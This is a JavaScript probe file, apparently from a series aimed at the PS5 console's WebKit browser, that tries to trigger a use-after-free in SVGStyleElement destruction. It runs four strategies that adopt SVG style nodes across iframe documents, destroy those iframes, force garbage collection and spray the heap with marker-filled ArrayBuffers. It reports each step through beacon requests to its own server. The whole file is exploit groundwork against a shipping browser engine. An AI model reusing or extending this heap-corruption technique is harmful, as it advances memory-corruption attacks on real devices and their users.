// p186 — SVGStyleElement destructor UAF probe for PS5 14.20
// WebKit Bug 260896 — heap-use-after-free in Style::Scope::removeStyleSheetCandidateNode
// during SVGStyleElement::~SVGStyleElement / ContainerNode::~ContainerNode
// Fixed Nov 2, 2023. PS5 runs Safari 17.0 (pre-fix) = VULNERABLE.
//
// Root cause: SVGStyleElement destructor calls removeStyleSheetCandidateNode
// on a Style::Scope that may have already been freed when the owning
// document was destroyed. The node was adopted into a different document
// context, but the style scope reference wasn't updated.
//
// Beacon prefix: V186-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;
  var NS = 'http://www.w3.org/2000/svg';

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V186-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Helper: create an SVG with an embedded <style> element
  function makeSVGWithStyle(cssText) {
    var svg = document.createElementNS(NS, 'svg');
    svg.setAttribute('width', '1');
    svg.setAttribute('height', '1');
    var style = document.createElementNS(NS, 'style');
    style.textContent = cssText || 'rect { fill: red; }';
    svg.appendChild(style);
    return { svg: svg, style: style };
  }

  // === STRATEGY 1: adoptNode cross-document with iframe destruction ===
  // Create SVG+style in iframe doc, adopt SVG into main doc,
  // destroy iframe. SVGStyleElement destructor accesses freed scope.
  function strategy1(attempt) {
    syncB('S1-' + attempt + '-START');
    try {
      var f = document.createElement('iframe');
      document.body.appendChild(f);
      var iDoc = f.contentDocument;
      if (!iDoc) { syncB('S1-' + attempt + '-NO-DOC'); return; }

      // Create SVG with style inside iframe's document
      var pair = makeSVGWithStyle('circle { fill: blue; }');
      iDoc.body.appendChild(pair.svg);
      syncB('S1-' + attempt + '-SVG-IN-IFRAME');

      // Adopt the SVG (with its style child) into main document
      // The style element still references the iframe's Style::Scope
      document.adoptNode(pair.svg);
      syncB('S1-' + attempt + '-ADOPTED');

      // Destroy the iframe — frees the iframe document and its Style::Scope
      f.remove();
      f = null;
      syncB('S1-' + attempt + '-IFRAME-REMOVED');

      // Force GC to actually free the iframe document memory
      var garbage = [];
      for (var g = 0; g < 50000; g++) {
        garbage.push({ k: g, v: [g, g + 1] });
      }
      garbage = null;
      syncB('S1-' + attempt + '-GC-PRESSURE');

      // Heap spray to reclaim freed Style::Scope memory
      var sprays = [];
      for (var s = 0; s < 300; s++) {
        var ab = new ArrayBuffer(256);
        var v = new Uint32Array(ab);
        for (var j = 0; j < v.length; j++) v[j] = 0x41414141;
        sprays.push(ab);
      }
      syncB('S1-' + attempt + '-SPRAYED');

      // Now trigger the destructor by removing the SVG from the DOM
      // (it was adopted but never appended to main doc, so it's detached)
      // Explicitly null out references to let GC collect the SVG+style
      pair.svg = null;
      pair.style = null;
      pair = null;

      // More GC pressure to trigger destructor
      for (var g = 0; g < 50000; g++) {
        var t = { a: g };
      }
      syncB('S1-' + attempt + '-DESTRUCTOR-TRIGGERED');

      // If we're still alive, either the bug didn't crash or the fix is present
      syncB('S1-' + attempt + '-ALIVE');
    } catch(e) {
      syncB('S1-' + attempt + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // === STRATEGY 2: appendChild then remove in different scope timing ===
  // Append SVG+style to iframe, then move to main doc via appendChild,
  // then destroy iframe, then remove the SVG from main doc.
  function strategy2(attempt) {
    syncB('S2-' + attempt + '-START');
    try {
      var f = document.createElement('iframe');
      document.body.appendChild(f);
      var iDoc = f.contentDocument;
      if (!iDoc) { syncB('S2-' + attempt + '-NO-DOC'); return; }

      // Build multiple SVG+style elements for higher chance
      var pairs = [];
      for (var i = 0; i < 20; i++) {
        var p = makeSVGWithStyle('.c' + i + ' { fill: #' + (100000 + i) + '; }');
        iDoc.body.appendChild(p.svg);
        pairs.push(p);
      }
      syncB('S2-' + attempt + '-CREATED-' + pairs.length);

      // Move all SVGs to main document
      for (var i = 0; i < pairs.length; i++) {
        document.body.appendChild(document.adoptNode(pairs[i].svg));
      }
      syncB('S2-' + attempt + '-MOVED-TO-MAIN');

      // Destroy iframe — frees the original Style::Scope
      f.remove();
      f = null;
      iDoc = null;
      syncB('S2-' + attempt + '-IFRAME-DESTROYED');

      // Spray
      var sprays = [];
      for (var s = 0; s < 500; s++) {
        var ab = new ArrayBuffer(128);
        var v = new Uint32Array(ab);
        for (var j = 0; j < v.length; j++) v[j] = 0xDEAD0000 + j;
        sprays.push(ab);
      }

      // Now remove the SVGs from main doc — this triggers SVGStyleElement
      // destructor which tries to access the freed Style::Scope
      for (var i = 0; i < pairs.length; i++) {
        try {
          pairs[i].svg.remove();
        } catch(e) {
          syncB('S2-' + attempt + '-REMOVE-ERR-' + i);
        }
      }
      syncB('S2-' + attempt + '-ALL-REMOVED');

      pairs = null;
      sprays = null;
      syncB('S2-' + attempt + '-ALIVE');
    } catch(e) {
      syncB('S2-' + attempt + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // === STRATEGY 3: innerHTML destruction with adopted style nodes ===
  // Create SVG in iframe, adopt just the <style> element (not the SVG parent),
  // then destroy iframe and let the orphaned style node be GC'd.
  function strategy3(attempt) {
    syncB('S3-' + attempt + '-START');
    try {
      var f = document.createElement('iframe');
      document.body.appendChild(f);
      var iDoc = f.contentDocument;
      if (!iDoc) { syncB('S3-' + attempt + '-NO-DOC'); return; }

      // Create SVG with style in iframe
      var svg = document.createElementNS(NS, 'svg');
      var styleEl = document.createElementNS(NS, 'style');
      styleEl.textContent = 'rect { stroke: green; }';
      svg.appendChild(styleEl);
      iDoc.body.appendChild(svg);
      syncB('S3-' + attempt + '-SETUP');

      // Remove the style from its SVG parent but keep a reference
      svg.removeChild(styleEl);
      syncB('S3-' + attempt + '-STYLE-DETACHED');

      // Adopt the detached style into main document
      document.adoptNode(styleEl);
      syncB('S3-' + attempt + '-STYLE-ADOPTED');

      // Destroy iframe
      f.remove();
      f = null;
      iDoc = null;
      svg = null;

      // GC pressure
      for (var g = 0; g < 100000; g++) { var t = [g]; }

      // Spray
      var sprays = [];
      for (var s = 0; s < 400; s++) {
        sprays.push(new ArrayBuffer(192));
      }
      syncB('S3-' + attempt + '-SPRAYED');

      // Drop reference to the style element — triggers destructor
      styleEl = null;
      for (var g = 0; g < 100000; g++) { var t = { x: g }; }

      syncB('S3-' + attempt + '-ALIVE');
    } catch(e) {
      syncB('S3-' + attempt + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // === STRATEGY 4: Nested iframes with style scope chain ===
  // Create iframe A containing iframe B. Put SVG+style in B.
  // Adopt SVG into A's doc. Destroy B. Then destroy A.
  function strategy4(attempt) {
    syncB('S4-' + attempt + '-START');
    try {
      var fA = document.createElement('iframe');
      document.body.appendChild(fA);
      var docA = fA.contentDocument;
      if (!docA) { syncB('S4-' + attempt + '-NO-DOCA'); return; }

      var fB = docA.createElement('iframe');
      docA.body.appendChild(fB);
      var docB = fB.contentDocument;
      if (!docB) { syncB('S4-' + attempt + '-NO-DOCB'); return; }

      // Create SVG+style in innermost iframe (B)
      var pair = makeSVGWithStyle('path { fill: purple; }');
      docB.body.appendChild(pair.svg);
      syncB('S4-' + attempt + '-SVG-IN-B');

      // Adopt into A's document
      docA.adoptNode(pair.svg);
      docA.body.appendChild(pair.svg);
      syncB('S4-' + attempt + '-SVG-IN-A');

      // Destroy inner iframe B — frees B's Style::Scope
      fB.remove();
      fB = null;
      docB = null;

      // Spray
      for (var s = 0; s < 200; s++) {
        var ab = new ArrayBuffer(256);
        var v = new Uint32Array(ab);
        v[0] = 0xBEEFCAFE;
      }
      syncB('S4-' + attempt + '-B-DESTROYED');

      // Now destroy A — this destroys the SVG which tries to access B's freed scope
      fA.remove();
      fA = null;
      docA = null;
      pair = null;

      for (var g = 0; g < 100000; g++) { var t = [g]; }
      syncB('S4-' + attempt + '-ALIVE');
    } catch(e) {
      syncB('S4-' + attempt + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // Run all strategies
  for (var i = 0; i < 3; i++) strategy1(i);
  for (var i = 0; i < 3; i++) strategy2(i);
  for (var i = 0; i < 3; i++) strategy3(i);
  for (var i = 0; i < 2; i++) strategy4(i);

  syncB('COMPLETE');
})();
